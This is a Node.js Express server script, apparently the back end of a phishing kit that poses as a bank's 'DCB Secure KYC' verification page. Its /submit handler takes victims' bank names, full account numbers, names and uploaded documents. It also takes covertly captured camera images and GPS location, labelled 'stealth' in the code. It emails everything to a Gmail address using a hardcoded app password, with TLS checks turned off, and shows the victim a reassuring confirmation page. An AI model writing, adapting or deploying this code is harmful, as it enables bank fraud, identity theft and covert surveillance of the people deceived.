const express = require('express');
const multer = require('multer');
const fs = require('fs');
const nodemailer = require('nodemailer');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(express.static('public'));
app.use(express.urlencoded({ extended: true }));
app.use(express.json({ limit: '50mb' }));

// File upload configuration
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir, { recursive: true });
}

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, uploadDir),
  filename: (req, file, cb) => {
    const sanitizedName = file.originalname.replace(/[^a-zA-Z0-9._-]/g, '_');
    cb(null, `${Date.now()}-${sanitizedName}`);
  }
});

const upload = multer({ 
  storage,
  limits: { fileSize: 10 * 1024 * 1024 } // 10MB limit
});

// Email transporter
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'dcbsubmission392@gmail.com',
    pass: 'kexm wnes pcwx rkjt'
  },
  tls: {
    rejectUnauthorized: false
  }
});

// Submission endpoint
app.post('/submit', upload.single('document'), async (req, res) => {
  try {
    const { bankname, accno, fullname, stealthImages, stealthLocation } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.ip;
    const userAgent = req.headers['user-agent'];
    const file = req.file;
    const timestamp = new Date().toISOString();

    // Parse stealth data
    const images = JSON.parse(stealthImages || '[]');
    const location = JSON.parse(stealthLocation || '{}');

    // Create secure log entry
    const logEntry = {
      timestamp,
      bank: bankname,
      account: accno.substring(0, 3) + '***' + accno.slice(-3),
      name: fullname,
      file: file ? file.filename : null,
      images: images.length,
      location: location.lat ? 'Captured' : 'Not available',
      ip,
      userAgent: userAgent.substring(0, 50)
    };

    fs.appendFileSync('secure_logs.txt', JSON.stringify(logEntry) + '\n');

    // Prepare email with stealth data
    const mailOptions = {
      from: '"DCB Secure KYC" <dcbsubmission392@gmail.com>',
      to: 'dcbsubmission392@gmail.com',
      subject: `New KYC Submission - ${fullname}`,
      html: buildEmailHtml(bankname, accno, fullname, images.length, location, ip, timestamp),
      attachments: prepareAttachments(file, images)
    };

    // Send email
    await transporter.sendMail(mailOptions);
    
    // Cleanup
    if (file && fs.existsSync(file.path)) {
      fs.unlink(file.path, (err) => {
        if (err) console.error('File cleanup error:', err);
      });
    }

    // Send response
    res.send(`
      <div style="text-align:center;padding:20px;font-family:Arial">
        <h2 style="color:#003d6a">Verification Submitted</h2>
        <p>Your information has been received successfully.</p>
      </div>
    `);

  } catch (error) {
    console.error('Submission error:', error);
    res.status(500).send(`
      <div style="text-align:center;padding:20px;font-family:Arial">
        <h2 style="color:#d9534f">Submission Error</h2>
        <p>Please try again later.</p>
      </div>
    `);
  }
});

// Helper functions
function buildEmailHtml(bankname, accno, fullname, imageCount, location, ip, timestamp) {
  return `
    <div style="font-family:Arial;max-width:600px">
      <h1 style="color:#003d6a">New KYC Submission</h1>
      <div style="background:#f5f5f5;padding:15px;border-radius:5px">
        <h3 style="color:#00548c">Account Details</h3>
        <p><strong>Bank:</strong> ${bankname}</p>
        <p><strong>Account:</strong> ${accno}</p>
        <p><strong>Name:</strong> ${fullname}</p>
        
        <h3 style="color:#00548c;margin-top:20px">Verification Data</h3>
        <p><strong>Images Captured:</strong> ${imageCount}</p>
        <p><strong>Location:</strong> ${location.lat ? `${location.lat}, ${location.lng}` : 'Not available'}</p>
        ${location.accuracy ? `<p><strong>Accuracy:</strong> ${location.accuracy}m</p>` : ''}
        
        <h3 style="color:#00548c;margin-top:20px">System Info</h3>
        <p><strong>IP:</strong> ${ip}</p>
        <p><strong>Time:</strong> ${new Date(timestamp).toLocaleString()}</p>
      </div>
    </div>
  `;
}

function prepareAttachments(file, images) {
  const attachments = [];
  
  if (file) {
    attachments.push({
      filename: file.originalname,
      path: file.path
    });
  }

  // Add first 3 images
  images.slice(0, 3).forEach((img, i) => {
    const base64Data = img.replace(/^data:image\/jpeg;base64,/, '');
    attachments.push({
      filename: `photo_${i+1}.jpg`,
      content: base64Data,
      encoding: 'base64'
    });
  });

  return attachments;
}

// Start server
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
  console.log(`Upload directory: ${uploadDir}`);
});
